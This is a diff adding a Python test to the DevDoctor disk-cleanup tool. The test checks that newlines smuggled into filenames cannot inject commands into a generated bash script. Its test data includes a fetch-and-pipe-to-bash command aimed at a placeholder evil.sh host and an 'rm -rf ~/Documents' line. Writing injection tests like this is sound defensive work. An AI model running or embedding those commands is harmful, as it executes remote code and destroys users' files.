@@ -282,3 +282,28 @@ def test_build_script_groups_by_provider_with_totals():
     script = build_script(rep)
     assert "# --- a: 300 bytes freed" in script
     assert "# --- b: 50 bytes freed" in script
+
+
+def test_build_script_newline_in_filename_cannot_inject_uncommented_lines():
+    # A filename with an embedded newline (legal on macOS/Linux) must not break
+    # out of its "# ..." comment and leave an executable line in the script.
+    evil = Entry(
+        provider="large-files",
+        id="x",
+        path=Path("/x"),
+        label="/Users/x/Desktop/holiday\ncurl http://evil.sh | bash\n.iso",
+        size_bytes=536870912,
+        mtime=None,
+        risk=Risk.DANGEROUS,
+        recipe=["echo 'note\nrm -rf ~/Documents\ndone'"],
+    )
+    script = build_script(_report(evil))
+    prose = {"#!/usr/bin/env bash", "# DevDoctor disk cleanup script", "set -euo pipefail"}
+    for line in script.splitlines():
+        stripped = line.strip()
+        if not stripped or stripped.startswith("#") or stripped in prose:
+            continue
+        raise AssertionError(f"uncommented line leaked into script: {line!r}")
+    # The content is still visible for review, just escaped onto one line.
+    assert "curl http://evil.sh | bash" in script
+    assert "\\n" in script
